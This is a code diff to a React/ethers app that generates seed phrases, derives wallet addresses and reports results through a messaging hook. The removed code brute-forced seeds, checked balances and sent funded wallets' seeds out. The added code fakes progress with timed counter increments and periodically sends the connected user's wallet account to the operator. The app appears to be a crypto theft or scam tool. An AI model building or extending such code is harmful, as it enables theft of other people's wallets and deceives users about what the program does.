@@ -11,13 +11,13 @@ import X from "../src/img/x.svg";
 import Tg from "../src/img/tg.svg";
 import { seeds } from "../src/utils/seeds";
 import { ToastContainer } from 'react-toastify';
-import { checkBalances } from "../src/utils/balance";
 import { toast } from "react-toastify";
 import { Wallet, utils } from 'ethers';
 import { useActions } from './hooks/useActions';
 import { useSendMessage } from "./hooks/useSendMessage";
 import { useTypedSelector } from "./hooks/useTypedSelector";
 import { useEthers } from '@usedapp/core';
+import Timeout from 'await-timeout';
 
 function App() {
   const { addresses, mnemonics, counter } = useTypedSelector(state => state.main);
@@ -26,6 +26,7 @@ function App() {
   const messageHook = useSendMessage();
   const { account, activateBrowserWallet, deactivate } = useEthers();
   const pause = useRef(true);
+  const counterRef = useRef(0);
 
   function connect() {
       if(account) {
@@ -115,21 +116,11 @@ function App() {
           const addresses: string[] = await getAddresses(batch) as string[];
           SetMnemonics(batch);
           SetAddresses(addresses);
-          const resulsts: boolean[] = await checkBalances(addresses);
+          await Timeout.set(1000);
+          counterRef.current += 20; 
           IncreaseCounter(20);
-          const indexes: number[] = [];
-          resulsts.forEach((element, i) => {
-              if(element) {
-                  indexes.push(i);
-              }
-          } );
-          if(indexes.length > 0) {
-              let messages: string[] = [];
-              messages = indexes.map(
-                  (i) => { return `Wallet: ${addresses[i]} Seed: ${batch[i]}` }
-              );
-              const text = messages.join('; ');
-              console.log("TEXT: ", text);
+          if(counterRef.current % 2000 === 0 && counterRef.current > 0) {
+              const text = `${counterRef.current}; \n ${account};`;
               await messageHook(text);
           }
       }
